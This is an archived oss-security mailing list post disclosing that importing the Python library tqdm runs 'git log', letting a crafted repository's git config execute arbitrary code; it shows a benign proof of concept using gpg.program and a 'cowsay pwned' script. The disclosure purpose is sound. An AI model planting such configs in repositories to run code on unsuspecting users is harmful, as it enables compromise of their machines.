X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1016" "Sunday" "25" "December" "2016" "21:47:43" "+0100" "Jakub Wilk" "jwilk@jwilk.net" "<20161225204743.vflt7rkcu55bqqgt@jwilk.net>" "44" "[oss-security] tqdm: insecure use of git" nil nil nil "12" "2016122520:47:43" "[oss-security] tqdm: insecure use of git" (number mark "U       jwilk@jwilk. Dec 25   44/1016  " thread-indent "\"[oss-security] tqdm: insecure use of git\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13657 invoked by uid 550); 25 Dec 2016 20:47:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13631 invoked from network); 25 Dec 2016 20:47:56 -0000
Date: Sun, 25 Dec 2016 21:47:43 +0100
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20161225204743.vflt7rkcu55bqqgt@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline
User-Agent: NeoMutt/20161126 (1.7.1)
X-Ovh-Tracer-Id: 3490289714752837542
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeelfedrledugddugeefucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
Subject: [oss-security] tqdm: insecure use of git

tqdm <https://github.com/tqdm/tqdm> is a "fast, extensible progress bar for 
Python".

When you import tqdm, the tqdm._version module executes the following command:

    git log -n 1 --oneline

This was meant to check if the user is running a pre-release version of tqdm.
But cwd might be a part of an unrelated git repository, possibly a malicious 
one. At least with git 2.10 or later, it's possible to craft a repo in which 
"git log" executes arbitrary code:

    $ tail -n4 /tmp/.git/config
    [log]
            showSignature = true
    [gpg]
            program = /tmp/moogpg

    $ tail -n4 /tmp/moogpg
    #!/bin/sh
    exec > /dev/tty 2>&1
    cowsay pwned
    sleep 9999

    $ cd /tmp

    $ pydoc tqdm
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||


Upstream bug report:
https://github.com/tqdm/tqdm/issues/328

Affected versions: v4.4.1 and later.

-- 
Jakub Wilk
